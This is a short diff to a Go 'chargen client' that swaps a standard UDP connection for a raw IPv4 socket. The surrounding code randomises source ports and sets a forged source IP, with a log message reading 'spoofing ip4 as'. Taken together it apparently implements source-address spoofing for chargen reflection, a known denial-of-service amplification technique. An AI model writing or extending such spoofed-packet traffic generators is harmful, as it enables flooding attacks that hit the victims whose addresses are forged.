@@ -13,6 +13,7 @@ import (
 	"github.com/bxcodec/faker"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
+	"golang.org/x/net/ipv4"
 )
 
 // Client represents a chargen client.
@@ -76,12 +77,17 @@ func NewClient(protocol, target string) (*Client, error) {
 			return nil, err
 		}
 
-		udpConn, err := net.DialUDP("udp", nil, addr)
+		udpConn, err := net.ListenPacket("ip4:udp", "0.0.0.0")
 		if err != nil {
 			return nil, err
 		}
 
-		conn = udpConn
+		rawConn, err := ipv4.NewRawConn(udpConn)
+		if err != nil {
+			return nil, err
+		}
+
+		conn = rawConn
 		l = append(l, &layers.UDP{
 			SrcPort: layers.UDPPort(rand.Intn(65535)),
 			DstPort: layers.UDPPort(port),
@@ -150,6 +156,7 @@ func (c *Client) UpdateSrcIP(newSrcInfo net.IP) error {
 		if newSrcInfo.String() == "<nil>" {
 			l.SrcIP = net.IP(a.IPV4)
 		}
+		log.Println(a.IPV4)
 		log.Printf("spoofing ip4 as: %v %v\n", a.IPV4, l.SrcIP.String())
 
 		if index := getLayerIndex(int64(l.LayerType())); index != -1 {
